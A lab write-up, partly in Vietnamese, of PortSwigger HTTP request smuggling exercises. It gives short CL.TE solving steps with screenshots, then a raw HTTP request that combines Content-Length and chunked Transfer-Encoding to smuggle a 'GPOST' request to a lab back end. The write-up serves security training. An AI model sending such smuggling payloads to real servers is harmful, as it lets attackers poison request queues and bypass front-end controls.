# [Portswigger] HTTP request smuggling

***

## 1. Lab: HTTP request smuggling, basic CL.TE vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```
* Giao diện web:

<img width="598" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2ae9cf1d-c0b7-470c-98b7-7e7852a7bf97">

* Exploit:

Thực hiện `Change Request Method` sang từ `GET` thành `POST`, lưu ý chuyển sang sử dụng `HTTP/1.1`

Tiến hành send request trên 2 lần => Đến lần thứ 2 sẽ ra thông báo lỗi như yêu cầu của đề bài.

![telegram-cloud-photo-size-5-6127662865662981520-y](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/65aa6883-737f-467f-af44-65c6e95be974)

Lab Solved!!!

![telegram-cloud-photo-size-5-6127662865662981521-y](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e7e5cb93-e7bb-4b4c-a22f-f848f18db027)

***
## 2. Lab:

```
POST / HTTP/1.1
Host: 0a5700bd049eb5f080b3262900b000fa.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

x=1
0


```
